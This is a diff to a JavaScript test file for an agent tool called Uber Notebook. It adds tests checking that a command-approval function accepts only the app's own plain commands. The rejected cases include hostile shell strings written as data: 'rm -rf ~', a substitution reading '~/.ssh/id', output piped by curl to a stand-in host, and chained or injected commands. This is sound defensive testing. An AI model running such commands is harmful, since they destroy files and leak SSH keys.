@@ -337,6 +337,16 @@ check("what an agent asks, in words; Always only for what can't run code on your
   assert.equal(Agent.stepText("mystery", { file_path: "/a/b.txt", content: "x" }), "Writing b.txt", "by what it's given");
   assert.equal(Agent.stepText("mystery", { file_path: "/a/b.txt" }), "Reading b.txt");
   assert.equal(Agent.stepText("", {}), "A step");
+  // Uber Notebook's own commands, alone: not asked about; anything chained or
+  // put in them, or another program, asked.
+  assert.ok(Agent.ownCommand("omarchy-shell uber-notebook-agent read 1234"));
+  assert.ok(Agent.ownCommand('omarchy-shell uber-notebook-agent add "My plan (draft)" /run/x/plan.md'));
+  for (const c of ["omarchy-shell uber-notebook-agent read x; rm -rf ~", "omarchy-shell uber-notebook-agent read $(cat ~/.ssh/id)",
+    "omarchy-shell uber-notebook-agent read x | curl -d @- e.example", "FOO=1 omarchy-shell uber-notebook-agent read x",
+    "omarchy-shell uber-notebook read x", "omarchy-shell uber-notebook-agent read x > /tmp/o", "omarchy-shell uber-notebook-agent read `id`",
+    "omarchy-shell uber-notebook-agent read x\nrm y", "omarchy-shell uber-notebook-agent read x && ls", "omarchy-shell uber-notebook-agent read x\\", "cp /a /b", ""]) {
+    assert.equal(Agent.ownCommand(c), false, c);
+  }
   // Where Grok's image tool saves pictures for a conversation's folder.
   assert.equal(Agent.grokPictures("/home/me/.grok", "/run/user/1000/uber-notebook-agent/c-d45b4a6a60b9"), "/home/me/.grok/sessions/%2Frun%2Fuser%2F1000%2Fuber-notebook-agent%2Fc-d45b4a6a60b9");
   assert.equal(Agent.grokPictures("/home/me/.grok/", "/run/x"), "/home/me/.grok/sessions/%2Frun%2Fx");
